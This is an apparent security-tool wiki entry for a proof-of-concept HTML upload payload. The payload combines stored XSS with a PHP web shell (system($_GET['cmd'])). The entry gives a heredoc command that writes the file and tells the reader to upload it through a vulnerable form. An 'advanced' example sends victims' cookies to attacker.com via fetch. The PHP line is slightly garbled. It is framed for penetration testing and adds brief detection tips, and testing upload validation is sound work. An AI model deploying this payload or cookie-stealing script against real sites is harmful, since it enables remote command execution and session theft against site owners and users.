---
url: null
tags:
  - xss-payload
  - php-shell
  - poc
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.429Z'
id: 1fb61ac4-070b-403d-87bd-ce5f55c27ab1
validated: true
submitted: true
---
# Malicious-HTML-Payload-for-XSS-and-PHP-Shell

**Status**: Unverified

## Overview

A proof-of-concept HTML file designed for upload exploitation, embedding JavaScript for stored XSS and PHP code for a simple web shell, demonstrating unrestricted upload vulnerabilities in web applications.

## Description

This custom payload file combines client-side XSS via <script> tags with server-side PHP execution for RCE. When uploaded and accessed, it triggers JavaScript in the browser for attacks like session hijacking, and if the server interprets HTML as PHP, it provides a command execution interface. Primarily used in penetration testing of file upload features lacking validation, such as in XPages environments.

## Features

- Feature 1: Embedded XSS JavaScript (e.g., alert or data exfiltration)
- Feature 2: Basic PHP shell (system($_GET['cmd'])) for RCE
- Feature 3: Dual-purpose: Works for both stored XSS and potential server execution

## Installation

### Requirements

- Text editor to create the file
- Knowledge of XSS and PHP syntax

### Install Commands

No installation; create manually:

```bash
# Create file with content
cat > unsure1.html << EOF
<!DOCTYPE html>
<html>
<body>
<script>alert('XSS Triggered');</script>
<?php if(isset(\\_GET['cmd'])) { system(\\_GET['cmd']); } ?>
</body>
</html>
EOF
```

## Basic Usage

Upload the file via the vulnerable form and access it to trigger.

### Common Options

N/A (static file)

| Option | Description |
|--------|-------------|
| N/A | Static HTML payload |

## Examples

### Example 1: Basic Usage

Create and upload the file as described in procedures.

### Example 2: Advanced Usage

Customize XSS for specific targets (e.g., replace alert with fetch for exfil):

```html
<script>fetch('http://attacker.com?cookie=' + document.cookie);</script>
```

And enhance shell: Add input form for cmd parameter.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[JavaScript]] JavaScript

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Scan uploads for <script> or <?php tags
- Detection method 2: Monitor access to / $FILE/ paths for anomalous requests

## Related Procedures


## Related Tools

- [[Burp Suite]] (for crafting payloads)
- [[Custom PHP Webshell]]

## References

- OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- HackerOne Report #900179
